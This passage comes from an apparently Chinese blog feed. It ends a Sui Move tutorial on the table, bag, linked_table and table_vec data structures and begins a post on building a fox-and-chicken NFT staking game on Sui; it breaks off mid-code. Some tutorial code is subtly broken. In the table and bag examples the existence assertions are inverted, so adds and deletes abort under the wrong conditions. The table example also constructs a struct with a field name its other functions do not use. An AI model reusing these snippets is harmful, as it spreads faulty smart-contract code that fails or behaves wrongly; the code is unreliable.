child.age</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查看</span></span><br><span class="line">    public fun <span class="title function_ invoke__">child_age_via_parent</span>(parent: &amp;Parent, index: <span class="type">u64</span>): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(!table::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildNotExists);</span><br><span class="line">        table::<span class="title function_ invoke__">borrow</span>(&amp;parent.children, index).age</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取长度</span></span><br><span class="line">    public fun <span class="title function_ invoke__">child_size_via_parent</span>(parent: &amp;Parent): <span class="type">u64</span> &#123;</span><br><span class="line">        table::<span class="title function_ invoke__">length</span>(&amp;parent.children)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(table::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildAlreadyExists);</span><br><span class="line">        table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.children, index, Child &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), value: <span class="number">0</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 修改</span></span><br><span class="line">    public fun <span class="title function_ invoke__">mutate_child</span>(child: &amp;<span class="keyword">mut</span> Child) &#123;</span><br><span class="line">        child.age = child.age + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mutate_child_via_parent</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">mutate_child</span>(table::<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> parent.children, index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 删除</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">delete_child</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(!table::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildNotExists);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">Child</span> &#123; id, age: _ &#125; = table::<span class="title function_ invoke__">remove</span>(</span><br><span class="line">            &amp;<span class="keyword">mut</span> parent.children,</span><br><span class="line">            index</span><br><span class="line">        );</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="bag">Bag</span></h3><p>Bag 的操作与 table 的操作接口类似：</p><ul><li>添加元素： <code>add</code></li><li>读取和修改元素： <code>borrow</code>，<code>borrow_mut</code></li><li>删除元素： <code>delete</code></li><li>元素长度： <code>length</code></li><li>判断存在性：<code>contains</code></li></ul><p>这里我们仅展示添加不同类型的键值对。</p><p><code>Object_bag</code> 的操作与 <code>bag</code> 类似。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::bags &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::object::&#123;<span class="keyword">Self</span>, UID&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::&#123;<span class="keyword">Self</span>, TxContext&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::bag::&#123;<span class="keyword">Self</span>, Bag&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> EChildAlreadyExists: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> EChildNotExists: <span class="type">u64</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Parent</span> has key &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        children: Bag,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child1</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        value: <span class="type">u64</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">Child2</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        value: <span class="type">u64</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">initialize</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        transfer::<span class="title function_ invoke__">transfer</span>(</span><br><span class="line">            Parent &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), children: bag::<span class="title function_ invoke__">new</span>(ctx) &#125;,</span><br><span class="line">            tx_context::<span class="title function_ invoke__">sender</span>(ctx)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加第一种类型</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child1</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(bag::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildAlreadyExists);</span><br><span class="line">        bag::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.children, index, Child1 &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), value: <span class="number">0</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加第二种类型</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">add_child2</span>(parent: &amp;<span class="keyword">mut</span> Parent, index: <span class="type">u64</span>, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(bag::<span class="title function_ invoke__">contains</span>(&amp;parent.children, index), EChildAlreadyExists);</span><br><span class="line">        bag::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> parent.children, index, Child2 &#123; id: object::<span class="title function_ invoke__">new</span>(ctx), value: <span class="number">0</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="linkedtable">LinkedTable</span></h3><p><code>linked_table</code> 是另一种使用 dynamic field 实现的数据结构，它与 <code>table</code> 类似，除此之外，它还支持值的有序插入和删除。因此，除了 table  类似的基础操作方法，还包含 <code>front</code>，<code>back</code>，<code>push_front</code>，<code>push_back</code>，<code>pop_front</code>，<code>pop_back</code>等操作，对于每一个键，也可以通过 <code>prev</code> 和 <code>next</code> 获取前一个和后一个插入的键。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::linked_tables &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::linked_table::&#123;</span><br><span class="line">        <span class="keyword">Self</span>,</span><br><span class="line">        push_front,</span><br><span class="line">        push_back,</span><br><span class="line">        borrow,</span><br><span class="line">        borrow_mut,</span><br><span class="line">        remove,</span><br><span class="line">        pop_front,</span><br><span class="line">        pop_back,</span><br><span class="line">        contains,</span><br><span class="line">        is_empty,</span><br><span class="line">        destroy_empty</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::TxContext;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">simple_all_functions</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">table</span> = linked_table::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">        <span class="comment">// 添加字段</span></span><br><span class="line">        <span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;hello&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;goodbye&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// [b&quot;hello&quot;, b&quot;goodbye&quot;]</span></span><br><span class="line">        <span class="comment">// 检查是否存在</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">contains</span>(&amp;table, <span class="string">b&quot;hello&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">contains</span>(&amp;table, <span class="string">b&quot;goodbye&quot;</span>), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(!<span class="title function_ invoke__">is_empty</span>(&amp;table), <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 修改</span></span><br><span class="line">        *<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;hello&quot;</span>) = *<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;hello&quot;</span>) * <span class="number">2</span>;</span><br><span class="line">        *<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;goodbye&quot;</span>) = *<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;goodbye&quot;</span>) * <span class="number">2</span>;</span><br><span class="line">        <span class="comment">// 检查修改之后的值</span></span><br><span class="line">        <span class="built_in">assert!</span>(*<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;hello&quot;</span>) == <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(*<span class="title function_ invoke__">borrow</span>(&amp;table, <span class="string">b&quot;goodbye&quot;</span>) == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 插入头部</span></span><br><span class="line">        <span class="title function_ invoke__">push_front</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;!!!&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="comment">// b&quot;!!!&quot;, b&quot;hello&quot;, b&quot;goodbye&quot;]</span></span><br><span class="line">        <span class="comment">// 在末尾添加</span></span><br><span class="line">        <span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;?&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        <span class="comment">// [b&quot;!!!&quot;, b&quot;hello&quot;, b&quot;goodbye&quot;, b&quot;?&quot;]</span></span><br><span class="line">        <span class="comment">// 从头部弹出</span></span><br><span class="line">        <span class="keyword">let</span> (front_k, front_v) = <span class="title function_ invoke__">pop_front</span>(&amp;<span class="keyword">mut</span> table);</span><br><span class="line">        <span class="built_in">assert!</span>(front_k == <span class="string">b&quot;!!!&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(front_v == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 从中间删除</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;goodbye&quot;</span>) == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// [b&quot;hello&quot;, b&quot;?&quot;]</span></span><br><span class="line">        <span class="comment">// 从末尾删除</span></span><br><span class="line">        <span class="keyword">let</span> (back_k, back_v) = <span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> table);</span><br><span class="line">        <span class="built_in">assert!</span>(back_k == <span class="string">b&quot;?&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(back_v == <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 移出值并检查</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">remove</span>(&amp;<span class="keyword">mut</span> table, <span class="string">b&quot;hello&quot;</span>) == <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// 检查不存在</span></span><br><span class="line">        <span class="built_in">assert!</span>(<span class="title function_ invoke__">is_empty</span>(&amp;table), <span class="number">0</span>);</span><br><span class="line">        <span class="title function_ invoke__">destroy_empty</span>(table);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="tablevec">TableVec</span></h3><p>最后，我们介绍一种基于 <code>table</code> 的数据结构 <code>table_vec</code>。从名字就可以看出，<code>table_vec</code> 是使用 <code>table</code> 实现的可扩展 <code>vector</code>，它使用元素在 <code>vector</code> 的索引作为 <code>table</code> 中的键进行存储。<code>table_vec</code> 提供了与 <code>vector</code> 类似的操作方法。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">module ds::table_vecs &#123;</span><br><span class="line">    <span class="keyword">use</span> sui::table_vec;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::TxContext;</span><br><span class="line"></span><br><span class="line">    public entry fun <span class="title function_ invoke__">example</span>(ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">vec</span> = table_vec::singleton&lt;<span class="type">u64</span>&gt;(<span class="number">1</span>, ctx);</span><br><span class="line"></span><br><span class="line">        table_vec::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> vec, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">length</span>(&amp;vec) == <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">v</span> = table_vec::<span class="title function_ invoke__">borrow_mut</span>(&amp;<span class="keyword">mut</span> vec, <span class="number">1</span>);</span><br><span class="line">        *v = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> vec) == <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> vec) == <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">assert!</span>(table_vec::<span class="title function_ invoke__">is_empty</span>(&amp;vec), <span class="number">2</span>);</span><br><span class="line">        table_vec::<span class="title function_ invoke__">destroy_empty</span>(vec);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译并运行示例：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sui client call \</span><br><span class="line">  --<span class="keyword">function</span> example \</span><br><span class="line">  --module table_vecs \</span><br><span class="line">  --package <span class="variable">$&#123;package_id&#125;</span> \</span><br><span class="line">  --gas-budget 30000</span><br></pre></td></tr></table></figure><p>至此，我们介绍完了 Sui Move 中主要的数据类型及其使用方法，希望大家学习和理解 Sui Move 有一定的帮助。</p><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Sui 数据类型讲解
    
    </summary>
    
      <category term="技术" scheme="https://qiwihui.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="技术" scheme="https://qiwihui.com/tags/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Sui 类狼羊游戏项目开发实践</title>
    <link href="https://qiwihui.com/qiwihui-blog-171/"/>
    <id>https://qiwihui.com/qiwihui-blog-171/</id>
    <published>2024-05-15T02:25:31.296Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章将向你介绍 Sui Move 版本的类狼羊游戏的合约和前端编写过程。阅读前，建议先熟悉以下内容：</p><ol><li>Sui 命令行的基本操作；</li><li>Move 语法（<a href="https://mp.weixin.qq.com/s/epwJmR6oXCgtKtSbBqJyAw">基础</a>和<a href="https://mp.weixin.qq.com/s/OXLyiUKzpFzAzc-PVxLvTA">高级</a>）和 Sui Move 的对象语法；</li><li>React 基本语法。</li></ol><p>项目代码：</p><ul><li>合约：<a href="https://github.com/AptosWolfGame/fox_game_contract">https://github.com/AptosWolfGame/fox_game_contract</a></li><li>前端： <a href="https://github.com/AptosWolfGame/fox_game_interface">https://github.com/AptosWolfGame/fox_game_interface</a></li></ul><p>在线 Demo： <a href="https://fox-game-interface.vercel.app/">https://fox-game-interface.vercel.app/</a></p><p><img src="https://user-images.githubusercontent.com/3297411/215304366-1aeb3308-5859-4613-a61a-f353d0b48877.png" alt="Untitled"></p><h2><span id="0x1-lang-yang-you-xi-de-gui-ze">0x1 狼羊游戏的规则</span></h2><p>狼羊游戏是以太坊上的 NFT 游戏，玩家通过购买NFT，然后将 NFT 质押来获取游戏代币 $WOOL，游戏代币 $WOOL 可用于之后的 NFT 铸造。有趣的是，狼羊游戏在这个过程中引入了随机性，让单纯的质押过程增加了不确定性，因而吸引了大量玩家参与到游戏中，狼羊游戏的可玩性也是建立在这个基础之上。具体的游戏规则为：</p><h3><span id="1-1-yang">1.1 <strong>羊</strong></span></h3><p>你有90%的概率铸造一只羊，每只羊都有独特的特征。以下是他们可以采取的行动：</p><ol><li><p>进入谷仓（Stake）</p></li><li><p>每天累积 10,000 羊毛 $WOOL</p></li><li><p>剪羊毛 $WOOL (Claim)</p><p>收到的羊毛80%累积在羊的身上，狼对剪下的羊毛收取20%的税，作为不攻击谷仓的回报。征税的 $WOOL 分配给目前在谷仓中质押的所有狼，数量与他们的 Alpha 分数成正比。</p></li><li><p>离开谷仓（Unstake）</p><p>羊被从谷仓中移除，所有 $WOOL 都被剪掉了。只有当羊积累了2天价值的 $WOOL 时才能离开谷仓，离开谷仓时你所有累积的 $WOOL 有50%的几率被狼全部偷走。被盗 $WOOL 分配给当前在谷仓中质押的所有狼，数量与他们的 Alpha 分数成正比。</p></li><li><p>使用 $WOOL 铸造一个新羊</p><p>铸造的 NFT 有10%的可能性实际上是狼！新的羊或狼有10%的几率被质押的狼偷走。每只狼的成功机会与他们的 Alpha 分数成正比。</p></li></ol><h3><span id="1-2-lang">1.2 <strong>狼</strong></span></h3><p>你有 10% 的机会铸造一只狼，每只狼都有独特的特征，包括 5~8 的 Alpha 值。Alpha值越高，狼从税收中赚取的 $WOOL 部分越高，偷一只新铸造的羊或狼的概率也越高。只有被质押的狼才能偷羊或赚取 $WOOL 税。</p><p>例子：狼A的 Alpha 为8，狼B的 Alpha 为6，并且他们都被质押。</p><ul><li>如果累计 70,000 羊毛作为税款，狼A将能够获得 40,000 羊毛，狼B将能够获得 30,000 羊毛；</li><li>如果新铸造的羊或狼被盗，狼A有57%概率获得，狼B有43%的概率获得。</li></ul><p>本次项目实践，我们将在 Sui 区块链上通过 Move 智能合约语言来实现游戏铸造，质押和获取 NFT 过程，并使用新的游戏元素：狐狸，鸡和鸡蛋，其中狐狸对应狼，鸡对应羊，鸡蛋对应羊毛，其他过程不变，我们将这个游戏命名为<strong>狐狸游戏</strong>。</p><h2><span id="0x2-he-yue-kai-fa">0x2 合约开发</span></h2><p>我们首先进行智能合约的编写，大致分为以下几个部分：</p><ul><li>创建 NFT</li><li>铸造 NFT（Mint）</li><li>质押 NFT （Stake）</li><li>鸡蛋（EGG）代币和收集鸡蛋（Collect/Claim）</li><li>提取 NFT（Unstake）</li></ul><h3><span id="2-1-nft-jie-gou">2.1 NFT 结构</span></h3><p>首先我们定义狐狸和鸡的 NFT 的结构，我们使用一个结构体 <code>FoxOrChicken</code> 来表示这个 NFT， 通过 <code>is_chicken</code> 来进行区分：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件：token_helper.move</span></span><br><span class="line">   <span class="comment">/// Defines a Fox or Chicken attribute. Eg: `pattern: &#x27;panda&#x27;`</span></span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">Attribute</span> has store, copy, drop &#123;</span><br><span class="line">       name: vector&lt;<span class="type">u8</span>&gt;,</span><br><span class="line">       value: vector&lt;<span class="type">u8</span>&gt;,</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">struct</span> <span class="title class_">FoxOrChicken</span> has key, store &#123;</span><br><span class="line">       id: UID,</span><br><span class="line">       index: <span class="type">u64</span>, <span class="comment">// 索引</span></span><br><span class="line">       is_chicken: <span class="type">bool</span>, <span class="comment">// 是否是鸡</span></span><br><span class="line">       alpha: <span class="type">u8</span>, <span class="comment">// 狐狸的 alpha</span></span><br><span class="line">       url: Url, <span class="comment">// 图片</span></span><br><span class="line">       link: Url, <span class="comment">// NFT 链接</span></span><br><span class="line">       item_count: <span class="type">u8</span>, <span class="comment">// 当前 NFT 的数量</span></span><br><span class="line">       attributes: vector&lt;Attribute&gt;, <span class="comment">// 属性</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>其中， <code>url</code> 既可以是指向 NFT 图片的链接，也可以是 base64 编码的字符串，比如 <code>data:image/svg+xml;base64,PHN2Zy......</code>。<code>link</code> 是一个指向 NFT 的页面。</p><h3><span id="2-2-chuang-jian-nft-dui-xiang">2.2 创建 NFT 对象</span></h3><p>整个创建 NFT 的逻辑大致就是根据随机种子生成对应属性索引，根据属性索引构建对应的属性列表和图片，从而创建 NFT。</p><p>创建 NFT 使用到 <code>FoCRegistry</code> 结构体，这个数据结构用于记录关于 NFT 的一些数据，比如 <code>foc_born</code> 记录生产的 NFT 总数，<code>foc_hash</code> 用于在生产 NFT 时产生随机数，该随机数用于生成 NFT 的属性，<code>foc_hash</code> 可以看作是 NFT 的基因。具体的属性值记录如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件：token_helper.move</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">struct</span> <span class="title class_">FoCRegistry</span> has key, store &#123;</span><br><span class="line">        id: UID,</span><br><span class="line">        foc_born: <span class="type">u64</span>, <span class="comment">// NFT supply</span></span><br><span class="line">        foc_hash: vector&lt;<span class="type">u8</span>&gt;, <span class="comment">// NFT gene</span></span><br><span class="line">        rarities: vector&lt;vector&lt;<span class="type">u8</span>&gt;&gt;, <span class="comment">// 属性值概率</span></span><br><span class="line">        aliases: vector&lt;vector&lt;<span class="type">u8</span>&gt;&gt;, <span class="comment">// 属性值索引</span></span><br><span class="line">        types: Table&lt;ID, <span class="type">bool</span>&gt;, <span class="comment">// NFT 对象 ID 与类型（是否为鸡）的对应</span></span><br><span class="line">        alphas: Table&lt;ID, <span class="type">u8</span>&gt;, <span class="comment">// 狐狸的 Alpha 值</span></span><br><span class="line">        trait_data: Table&lt;<span class="type">u8</span>, Table&lt;<span class="type">u8</span>, Trait&gt;&gt;, <span class="comment">// 属性值，第一个u8是类型编号，第二个u8是属性索引</span></span><br><span class="line">        trait_types: vector&lt;vector&lt;<span class="type">u8</span>&gt;&gt;, <span class="comment">// 属性类型名称</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>创建 NFT 方法 <code>create_foc</code> 如下：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件：token_helper.move</span></span><br><span class="line">        <span class="title function_ invoke__">public</span>(friend) fun <span class="title function_ invoke__">create_foc</span>(</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> FoCRegistry, ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ): FoxOrChicken &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">id</span> = object::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">        reg.foc_born = reg.foc_born + <span class="number">1</span>;</span><br><span class="line">        <span class="comment">// 根据 UID 与旧 foc_hash 生产新的 foc_hash</span></span><br><span class="line">        vec::<span class="title function_ invoke__">append</span>(&amp;<span class="keyword">mut</span> reg.foc_hash, object::<span class="title function_ invoke__">uid_to_bytes</span>(&amp;id));</span><br><span class="line">        reg.foc_hash = <span class="title function_ invoke__">hash</span>(reg.foc_hash);</span><br><span class="line">        <span class="comment">// 随机产生 trait，并生成属性对 attributes</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">fc</span> = <span class="title function_ invoke__">generate_traits</span>(reg);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">attributes</span> = <span class="title function_ invoke__">get_attributes</span>(reg, &amp;fc);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">alpha</span> = *vec::<span class="title function_ invoke__">borrow</span>(&amp;ALPHAS, (fc.alpha_index <span class="keyword">as</span> <span class="type">u64</span>));</span><br><span class="line">        <span class="comment">// 记录ID对应类型</span></span><br><span class="line">        table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> reg.types, object::<span class="title function_ invoke__">uid_to_inner</span>(&amp;id), fc.is_chicken);</span><br><span class="line">        <span class="keyword">if</span> (!fc.is_chicken) &#123;</span><br><span class="line">            table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> reg.alphas, object::<span class="title function_ invoke__">uid_to_inner</span>(&amp;id), alpha);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 生成事件</span></span><br><span class="line">        <span class="title function_ invoke__">emit</span>(FoCBorn &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">uid_to_inner</span>(&amp;id),</span><br><span class="line">            index: reg.foc_born,</span><br><span class="line">            attributes: *&amp;attributes,</span><br><span class="line">            created_by: tx_context::<span class="title function_ invoke__">sender</span>(ctx),</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 返回生成的 FoxOrChicken</span></span><br><span class="line">        FoxOrChicken &#123;</span><br><span class="line">            id,</span><br><span class="line">            index: reg.foc_born,</span><br><span class="line">            is_chicken: fc.is_chicken,</span><br><span class="line">            alpha: alpha,</span><br><span class="line">            url: <span class="title function_ invoke__">img_url</span>(reg, &amp;fc),</span><br><span class="line">            link: <span class="title function_ invoke__">link_url</span>(reg.foc_born, fc.is_chicken),</span><br><span class="line">            attributes,</span><br><span class="line">            item_count: <span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>其中 <code>genetate_traits</code> 用于根据 <code>foc_hash</code> 生成 NFT 的属性值，此处属性为对应属性值的索引，<code>select_trait</code> 根据 A.J. Walker’s Alias 算法根据预先设置好的每一个属性的随机概率（<code>rarities</code>）来快速生成对应的属性索引。详情可以参考文章 <a href="https://zhuanlan.zhihu.com/p/436785581">https://zhuanlan.zhihu.com/p/436785581</a> 中 A.J. Walker’s Alias 算法一节****。****</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件： token_helper.move</span></span><br><span class="line">        <span class="comment">// generates traits for a specific token, checking to make sure it&#x27;s unique</span></span><br><span class="line">    public fun <span class="title function_ invoke__">generate_traits</span>(</span><br><span class="line">        reg: &amp;FoCRegistry,</span><br><span class="line">        <span class="comment">// seed: &amp;vector&lt;u8&gt;</span></span><br><span class="line">    ): Traits &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">seed</span> = reg.foc_hash;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">is_chicken</span> = *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">0</span>) &gt;= <span class="number">26</span>; <span class="comment">// 90% 0f 255</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">shift</span> = <span class="keyword">if</span> (is_chicken) <span class="number">0</span> <span class="keyword">else</span> <span class="number">9</span>;</span><br><span class="line">        <span class="comment">// 根据随机种子生成属性</span></span><br><span class="line">                Traits &#123;</span><br><span class="line">            is_chicken,</span><br><span class="line">            fur: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">1</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">10</span>), <span class="number">0</span> + shift),</span><br><span class="line">            head: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">2</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">11</span>), <span class="number">1</span> + shift),</span><br><span class="line">            ears: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">3</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">12</span>), <span class="number">2</span> + shift),</span><br><span class="line">            eyes: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">4</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">13</span>), <span class="number">3</span> + shift),</span><br><span class="line">            nose: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">5</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">14</span>), <span class="number">4</span> + shift),</span><br><span class="line">            mouth: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">6</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">15</span>), <span class="number">5</span> + shift),</span><br><span class="line">            neck: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">7</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">16</span>), <span class="number">6</span> + shift),</span><br><span class="line">            feet: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">8</span>), *vec::<span class="title 